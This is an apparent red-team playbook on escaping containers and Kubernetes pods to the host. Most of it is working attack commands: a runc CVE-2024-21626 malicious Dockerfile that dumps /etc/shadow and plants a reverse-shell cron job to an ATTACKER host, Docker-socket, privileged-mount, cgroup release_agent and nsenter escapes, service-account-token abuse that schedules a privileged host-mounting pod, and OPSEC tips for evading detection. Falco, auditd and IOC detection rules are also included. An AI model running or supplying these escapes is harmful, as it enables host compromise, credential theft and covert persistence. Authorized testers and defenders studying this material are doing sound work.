# Container & Namespace Escape

Privilege escalation in 2024-2026 increasingly means escaping a container/pod to the host node.
This cluster covers detecting containerization, the runc Leaky Vessels escape, the high-impact
configuration escapes (Docker socket, privileged, `--pid=host`, `CAP_SYS_PTRACE`, cgroup
`release_agent`), user namespaces, and Kubernetes service-account-token → pod escape.

## Theory / mechanism

A container is a process with restricted namespaces (mnt/net/pid/user/uts/ipc), a reduced capability
set, a seccomp filter, and (maybe) AppArmor/SELinux + cgroup limits. An escape is any path that lets a
container process touch the host kernel/filesystem with higher effective privilege than intended:

- **Excess capability/config** — `--privileged`, `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, mounted
  `docker.sock`, `--pid=host`, host volume mounts. These are misconfigurations, not bugs.
- **Runtime bug** — runc/BuildKit/containerd flaws (Leaky Vessels) that leak host references.
- **Kernel bug reachable from the container** — e.g. CVE-2024-1086 via an unprivileged userns inside
  the container (`switch_task_namespaces` then breaks out).

```bash
# Am I in a container, and what kind?
cat /proc/1/cgroup | grep -iE 'docker|kubepods|lxc|containerd'
ls -la /.dockerenv 2>/dev/null; cat /run/.containerenv 2>/dev/null
cat /proc/self/status | grep CapEff   # decode: capsh --decode=<hex>
mount | grep -E 'overlay|cgroup'; cat /proc/mounts | grep docker.sock
env | grep -i KUBERNETES; ls /var/run/secrets/kubernetes.io 2>/dev/null
```

`scripts/container_escape_check.sh` automates all of the above plus the runc-version check and ranks
the available escape vectors.

## runc Leaky Vessels — CVE-2024-21626 (VERIFIED, CVSS 8.6)

Disclosed Jan 2024 by Snyk (Rory McNamara). runc leaks an internal file descriptor pointing at a
**host** directory before `pivot_root` (CWE-668). By setting the container's working directory to
`/proc/self/fd/<n>` (the leaked fd, typically 7-9), the container process lands in a host directory →
escape. Affects **all runc ≤ 1.1.11** (Docker, containerd, Kubernetes, etc.). Fixed in runc 1.1.12.

Two delivery vectors:
1. **Malicious image** — `WORKDIR /proc/self/fd/8` (or similar) in a Dockerfile; victim runs the image.
2. **`runc exec`** — set `process.cwd` to `/proc/self/fd/<n>` on a running container.

```bash
# Check runc version on the host/node (from inside, if you can reach it, or post-escape)
runc --version 2>/dev/null   # need <= 1.1.11 to be vulnerable

# Malicious-image PoC Dockerfile (escape on first run): brute the leaked fd
cat > Dockerfile <<'EOF'
FROM alpine:3.19
# The leaked host-cwd fd is usually one of 7,8,9. Point WORKDIR at it.
WORKDIR /proc/self/fd/8
RUN ["/bin/sh","-c","cd ../../.. && cat etc/shadow > /host_shadow 2>/dev/null; \
     echo '* * * * * root bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' >> etc/crontab"]
EOF
# Build/run; if fd 8 isn't right, iterate 7..15. Reading ../../../etc/shadow proves host FS access.

# runc exec vector against a running container (need access to the runtime):
runc exec --cwd /proc/self/fd/7 <container-id> /bin/sh -c 'cat /../../../etc/shadow'
```

A robust public PoC (`strikoder/cve-2024-21626-runc-1.1.11-escape`) sets `process.cwd` to
`/proc/self/fd/7` and writes to the host. Post-escape, drop a host crontab/SSH key for persistence per ROE.

Mitigations: runc ≥ 1.1.12 / BuildKit ≥ 0.12.5; SELinux targeted enforcing (RHEL/OpenShift) blocks it;
seccomp restricting `/proc` access; rootless/gVisor/Kata for stronger isolation.

## Configuration escapes (no bug required)

### Docker socket mounted into the container

```bash
ls -la /var/run/docker.sock 2>/dev/null   # if present and writable -> game over
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host bash
# No docker client? talk to the API directly with curl over the socket:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Privileged container / host devices visible

```bash
fdisk -l 2>/dev/null                       # see host disks -> mount them
mkdir /hostfs && mount /dev/sda1 /hostfs && chroot /hostfs   # then read/write host FS
# write host persistence:
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /hostfs/etc/crontab
```

### CAP_SYS_ADMIN + AppArmor unconfined → cgroup-v1 release_agent

```bash
# Works when CAP_SYS_ADMIN is present and you can mount a cgroup v1 controller.
d=/tmp/cgrp; mkdir -p $d; mount -t cgroup -o rdma cgroup $d 2>/dev/null || \
  mount -t cgroup -o memory cgroup $d
mkdir -p $d/x; echo 1 > $d/x/notify_on_release
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > $d/release_agent
printf '#!/bin/sh\ncat /etc/shadow > %s/out 2>/dev/null\n' "$host_path" > /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/x/cgroup.procs"      # empty cgroup -> kernel runs release_agent as root on host
sleep 1; cat /out
```

### CAP_SYS_PTRACE + host PID namespace (`--pid=host`)

```bash
ps aux | head                                  # if you see host PID 1 / systemd -> host pidns
nsenter -t 1 -m -u -i -n -p -- /bin/bash       # enter host namespaces via PID 1 -> host root shell
cat /proc/1/root/etc/shadow                     # or read host files via PID 1's root
# CAP_SYS_PTRACE alone: inject shellcode into a privileged host process via /proc/<pid>/mem
```

### Exposed /proc/sysrq-trigger / host /proc mounts

```bash
ls -la /proc/sysrq-trigger 2>/dev/null && echo "writable sysrq -> can crash/reboot host (DoS only)"
# A host /proc mount lets you read host process env/creds: cat /proc/<hostpid>/environ
```

## User namespaces (escalation primitive)

Unprivileged user namespaces grant "root" *inside* the namespace and `CAP_*` over namespaced
resources — the precondition for CVE-2024-1086, GameOver(lay), and several nftables LPEs.

```bash
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null   # 1 = available to unprivileged users
unshare -Urm   # uid 0 inside the new user+mnt namespace; combine with a kernel bug for real root
unshare -rn nft ... # get CAP_NET_ADMIN for the nf_tables LPE path
```

## Kubernetes pod escape

```bash
# 1. Service-account token -> API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -sk $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods \
  -H "Authorization: Bearer $TOKEN"
kubectl auth can-i --list --token="$TOKEN"     # what can this SA do?

# 2. If you can create pods -> schedule a privileged pod that mounts the host FS:
kubectl --token="$TOKEN" apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: { name: esc }
spec:
  hostPID: true
  containers:
  - name: s
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF
kubectl --token="$TOKEN" exec -it esc -- chroot /host bash

# 3. hostNetwork=true pods -> reach kubelet (10250), etcd (2379) on the node's localhost.
curl -sk https://127.0.0.1:10250/pods       # kubelet read; /run/<ns>/<pod>/<ctr> for exec on some configs
```

## Detection

**Falco (the de-facto container-runtime detector):**

```yaml
- rule: runc cwd Container Escape (CVE-2024-21626)
  desc: process cwd pointing at a leaked host fd
  condition: spawned_process and proc.cwd startswith /proc/self/fd/
  output: "Possible runc fd-leak escape (cwd=%proc.cwd cmd=%proc.cmdline ctr=%container.id)"
  priority: CRITICAL
- rule: Mount Launched in Container
  condition: spawned_process and container and proc.name=mount
  output: "mount inside container (cmd=%proc.cmdline ctr=%container.id)"
  priority: WARNING
- rule: Docker Socket Access from Container
  condition: open_write and container and fd.name=/var/run/docker.sock
  output: "docker.sock written from container (cmd=%proc.cmdline)"
  priority: CRITICAL
- rule: cgroup release_agent Write
  condition: open_write and fd.name endswith release_agent
  output: "release_agent written (escape attempt) %proc.cmdline"
  priority: CRITICAL
- rule: nsenter Into Host Namespaces
  condition: spawned_process and proc.name=nsenter and proc.args contains "-t 1"
  output: "nsenter into host ns from container %proc.cmdline"
  priority: CRITICAL
```

**auditd (host/node):**
```
-a always,exit -F arch=b64 -S unshare -F a0&0x10000000 -k userns_create
-w /var/run/docker.sock -p wa -k docker_sock
-a always,exit -F arch=b64 -S mount -k mount_event
-a always,exit -F arch=b64 -S ptrace -k ptrace
```

**IOCs / EDR (CWP — CrowdStrike/SentinelOne/Aqua/Sysdig):**
- A container process with `cwd` under `/proc/self/fd/` or accessing host paths (`../../../etc/shadow`).
- `mount`, `nsenter -t 1`, `chroot /host`, `losetup`, or `docker`/`curl --unix-socket docker.sock`
  executed *inside* a container.
- Writes to `*/release_agent`, `notify_on_release`, or a cgroup `cgroup.procs` from a container.
- New privileged/`hostPID`/`hostPath:/` pod created by a SA that doesn't normally create pods;
  `kubectl auth can-i --list` from a pod; kubelet (10250) access from a workload pod.
- runc version ≤ 1.1.11 on the node (vuln state).

## OPSEC

- **Touches:** Falco/CWP are *purpose-built* for these patterns — escapes are among the most-monitored
  actions in container estates. Host crontab/SSH-key drops, new K8s pods, loop devices, and
  `release_agent`/`/cmd` files are durable IOCs. `nsenter`/`chroot` show up plainly in process telemetry.
- **Cleanup:** remove host persistence you dropped (crontab line, SSH key, `/cmd`, `/out`); `umount`
  any host mounts and `losetup -d` loop devices; `kubectl delete pod esc`; unmount cgroup; shred
  staged images. Don't leave `/host` mounts attached.
- **Evasion:** confirm scope before running — escapes frequently page the SOC. Prefer the quietest
  viable vector (reading one host file via a leaked fd vs. spawning `chroot /host bash`); avoid
  `--privileged docker run` if a single host-file read proves impact; reuse the container's own tooling
  (busybox `mount`) rather than uploading binaries. If using the kernel route (CVE-2024-1086 via
  userns) the namespace-creation event is logged — weigh against config escapes.

## References

- Snyk, **Leaky Vessels (CVE-2024-21626 et al.)** — https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- Wiz, Leaky Vessels analysis — https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities
- NVD CVE-2024-21626 — https://nvd.nist.gov/vuln/detail/cve-2024-21626
- strikoder, runc 1.1.11 escape PoC — https://github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
- HackTricks, *Docker / Kubernetes breakout* — https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
- Falco rules — https://github.com/falcosecurity/rules
